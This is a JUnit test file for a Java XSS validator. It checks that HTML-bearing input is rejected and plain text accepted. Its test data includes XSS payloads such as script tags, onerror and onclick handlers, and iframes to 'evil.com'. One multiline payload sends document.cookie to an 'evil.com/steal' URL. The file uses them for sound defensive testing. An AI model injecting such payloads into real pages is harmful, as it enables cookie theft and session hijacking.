package com.wzkris.common.validator.impl;

import jakarta.validation.ConstraintValidatorContext;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.mockito.Mockito;

import static org.junit.jupiter.api.Assertions.*;

/**
 * XssValidator 测试类
 *
 * @author wzkris
 */
@DisplayName("XSS验证器测试")
class XssValidatorTest {

    private final XssValidator validator = new XssValidator();
    private final ConstraintValidatorContext context = Mockito.mock(ConstraintValidatorContext.class);

    @Test
    @DisplayName("测试正常文本 - 不包含HTML")
    void testNormalText() {
        String text = "这是一段正常的文本内容";
        assertFalse(XssValidator.containsHtml(text));
        assertTrue(validator.isValid(text, context));
    }

    @Test
    @DisplayName("测试包含HTML标签")
    void testContainsHtmlTag() {
        String text = "<script>alert('xss')</script>";
        assertTrue(XssValidator.containsHtml(text));
        assertFalse(validator.isValid(text, context));
    }

    @Test
    @DisplayName("测试包含div标签")
    void testContainsDivTag() {
        String text = "<div>内容</div>";
        assertTrue(XssValidator.containsHtml(text));
        assertFalse(validator.isValid(text, context));
    }

    @Test
    @DisplayName("测试包含img标签")
    void testContainsImgTag() {
        String text = "<img src='test.jpg' />";
        assertTrue(XssValidator.containsHtml(text));
        assertFalse(validator.isValid(text, context));
    }

    @Test
    @DisplayName("测试包含自闭合标签")
    void testContainsSelfClosingTag() {
        String text = "<br />";
        assertTrue(XssValidator.containsHtml(text));
        assertFalse(validator.isValid(text, context));
    }

    @Test
    @DisplayName("测试包含script标签")
    void testContainsScriptTag() {
        // 测试纯script标签
        String text = "<script>恶意代码</script>";
        assertTrue(XssValidator.containsHtml(text));
        assertFalse(validator.isValid(text, context));
        
        // 测试混合内容中的script标签
        String mixedScript = "正常文本<script>alert('xss')</script>更多文本";
        assertTrue(XssValidator.containsHtml(mixedScript));
        assertFalse(validator.isValid(mixedScript, context));
    }

    @Test
    @DisplayName("测试包含iframe标签")
    void testContainsIframeTag() {
        String text = "<iframe src='evil.com'></iframe>";
        assertTrue(XssValidator.containsHtml(text));
        assertFalse(validator.isValid(text, context));
    }

    @Test
    @DisplayName("测试包含onclick事件")
    void testContainsOnclickEvent() {
        String text = "<div onclick='alert(1)'>点击</div>";
        assertTrue(XssValidator.containsHtml(text));
        assertFalse(validator.isValid(text, context));
    }

    @Test
    @DisplayName("测试null值")
    void testNull() {
        // isValid方法会处理null值，返回true（根据Jakarta Bean Validation规范，null值应该通过验证）
        assertTrue(validator.isValid(null, context));
        
        // containsHtml方法不处理null，直接调用会抛出NullPointerException
        // 所以不应该直接测试containsHtml(null)，应该通过isValid来测试null值处理
    }

    @Test
    @DisplayName("测试空字符串")
    void testEmptyString() {
        assertFalse(XssValidator.containsHtml(""));
        assertTrue(validator.isValid("", context));
    }

    @Test
    @DisplayName("测试纯文本 - 不包含HTML")
    void testPlainText() {
        String[] plainTexts = {
            "Hello World",
            "123456",
            "测试中文",
            "email@example.com",
            "http://example.com",
            "特殊字符!@#$%^&*()"
        };
        
        for (String text : plainTexts) {
            assertFalse(XssValidator.containsHtml(text), 
                "Text '" + text + "' should not contain HTML");
            assertTrue(validator.isValid(text, context));
        }
    }

    @Test
    @DisplayName("测试XSS攻击示例 - script标签")
    void testXssAttack_Script() {
        String[] xssAttacks = {
            "<script>alert('XSS')</script>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            "<script src='evil.js'></script>",
            "<script>document.cookie</script>"
        };
        
        for (String attack : xssAttacks) {
            assertTrue(XssValidator.containsHtml(attack), 
                "XSS attack '" + attack + "' should be detected");
            assertFalse(validator.isValid(attack, context));
        }
    }

    @Test
    @DisplayName("测试XSS攻击示例 - 事件处理器")
    void testXssAttack_EventHandlers() {
        String[] xssAttacks = {
            "<img src='x' onerror='alert(1)'>",
            "<div onmouseover='alert(1)'>hover</div>",
            "<a href='#' onclick='evil()'>link</a>"
        };
        
        for (String attack : xssAttacks) {
            assertTrue(XssValidator.containsHtml(attack), 
                "XSS attack '" + attack + "' should be detected");
            assertFalse(validator.isValid(attack, context));
        }
    }

    @Test
    @DisplayName("测试XSS攻击示例 - iframe")
    void testXssAttack_Iframe() {
        String[] xssAttacks = {
            "<iframe src='evil.com'></iframe>",
            "<iframe></iframe>",
            "<IFRAME SRC='EVIL.COM'></IFRAME>"
        };
        
        for (String attack : xssAttacks) {
            assertTrue(XssValidator.containsHtml(attack), 
                "XSS attack '" + attack + "' should be detected");
            assertFalse(validator.isValid(attack, context));
        }
    }

    @Test
    @DisplayName("测试包含HTML但格式不完整")
    void testIncompleteHtml() {
        String text = "<div>未闭合的标签";
        // 根据正则表达式，这可能也会被检测到
        boolean containsHtml = XssValidator.containsHtml(text);
        assertNotNull(String.valueOf(containsHtml));
    }

    @Test
    @DisplayName("测试包含HTML实体编码")
    void testHtmlEntities() {
        // HTML实体编码不应该被检测为HTML标签
        String text = "&lt;script&gt;alert('xss')&lt;/script&gt;";
        assertFalse(XssValidator.containsHtml(text));
        assertTrue(validator.isValid(text, context));
    }

    @Test
    @DisplayName("测试包含尖括号但不构成标签")
    void testAngleBracketsNotTags() {
        // 单独的尖括号不应该被检测为HTML
        String text = "3 < 5 and 7 > 4";
        // 注意：这取决于正则表达式的实现
        boolean result = XssValidator.containsHtml(text);
        assertNotNull(String.valueOf(result));
    }

    @Test
    @DisplayName("测试混合内容")
    void testMixedContent() {
        // 测试纯HTML标签（可以被检测到）
        String pureHtml = "<script>alert('xss')</script>";
        assertTrue(XssValidator.containsHtml(pureHtml));
        assertFalse(validator.isValid(pureHtml, context));
        
        // 测试混合内容（现在应该能够被检测到）
        String mixedText = "正常文本<script>alert('xss')</script>更多文本";
        assertTrue(XssValidator.containsHtml(mixedText), "混合内容中的HTML标签应该被检测到");
        assertFalse(validator.isValid(mixedText, context), "包含HTML标签的混合内容应该验证失败");
        
        // 测试HTML标签在开头
        String htmlAtStart = "<div>内容</div>正常文本";
        assertTrue(XssValidator.containsHtml(htmlAtStart));
        assertFalse(validator.isValid(htmlAtStart, context));
        
        // 测试HTML标签在中间
        String htmlInMiddle = "前面文本<img src='test.jpg' />后面文本";
        assertTrue(XssValidator.containsHtml(htmlInMiddle));
        assertFalse(validator.isValid(htmlInMiddle, context));
        
        // 测试HTML标签在结尾
        String htmlAtEnd = "正常文本<span>内容</span>";
        assertTrue(XssValidator.containsHtml(htmlAtEnd));
        assertFalse(validator.isValid(htmlAtEnd, context));
        
        // 测试纯HTML自闭合标签
        String selfClosing = "<br />";
        assertTrue(XssValidator.containsHtml(selfClosing));
        assertFalse(validator.isValid(selfClosing, context));
    }

    @Test
    @DisplayName("测试多行HTML")
    void testMultilineHtml() {
        // 测试多行HTML标签
        String multilineHtml = """
                <div>
                  <p>内容</p>
                </div>""";
        assertTrue(XssValidator.containsHtml(multilineHtml), "多行HTML应该被检测到");
        assertFalse(validator.isValid(multilineHtml, context));
        
        // 测试多行script标签
        String multilineScript = """
                <script>
                  alert('xss');
                  document.cookie = 'stolen';
                </script>""";
        assertTrue(XssValidator.containsHtml(multilineScript));
        assertFalse(validator.isValid(multilineScript, context));
        
        // 测试混合内容中的多行HTML
        String mixedMultiline = "正常文本\n" +
                               "<div>\n" +
                               "  <p>恶意内容</p>\n" +
                               "</div>\n" +
                               "更多文本";
        assertTrue(XssValidator.containsHtml(mixedMultiline), "混合内容中的多行HTML应该被检测到");
        assertFalse(validator.isValid(mixedMultiline, context));
    }

    @Test
    @DisplayName("测试嵌套HTML标签")
    void testNestedHtmlTags() {
        String text = "<div><span><strong>内容</strong></span></div>";
        assertTrue(XssValidator.containsHtml(text));
        assertFalse(validator.isValid(text, context));
    }

    @Test
    @DisplayName("测试实际使用场景")
    void testRealWorldScenarios() {
        // 用户输入的正常文本
        assertTrue(validator.isValid("用户名：张三", context));
        assertTrue(validator.isValid("邮箱：test@example.com", context));
        assertTrue(validator.isValid("电话：13812345678", context));
        
        // 恶意输入 - 纯HTML标签
        assertFalse(validator.isValid("<script>stealCookie()</script>", context));
        assertFalse(validator.isValid("<img src=x onerror=alert(1)>", context));
        
        // 恶意输入 - 混合内容（现在应该能够检测到）
        assertFalse(validator.isValid("正常文本<script>evil</script>", context), 
            "混合内容中的HTML标签应该被检测到");
        assertFalse(validator.isValid("用户输入：<div onclick='alert(1)'>点击</div>", context));
        assertFalse(validator.isValid("评论内容：<iframe src='evil.com'></iframe>", context));
        
        // 恶意输入 - 多行HTML
        String multilineAttack = """
                用户提交的内容：
                <script>
                  document.location='http://evil.com/steal?cookie='+document.cookie;
                </script>""";
        assertFalse(validator.isValid(multilineAttack, context), "多行HTML攻击应该被检测到");
    }
}

